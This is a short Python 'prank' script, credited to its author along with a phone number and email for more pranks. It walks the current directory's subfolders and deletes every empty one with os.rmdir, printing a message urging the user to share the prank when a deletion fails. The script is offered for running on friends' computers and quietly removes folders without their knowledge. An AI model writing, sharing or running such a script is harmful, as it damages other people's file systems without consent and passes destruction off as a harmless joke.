# This articles is made by Simon
"""Don't edit any of this section because it wont work"""
# For more python pranks
"""whatsapp 0707455652,"""
"""email: netflixblackbelt@gmail.com"""

import os
a = os.getcwd()
f = sorted(list(os.walk(a))[1:], reverse=True)
for fld in f:
    try:
        os.rmdir(fld[0])
    except OSError as error:
        print("\U0001F637: Share the prank with your Friend")
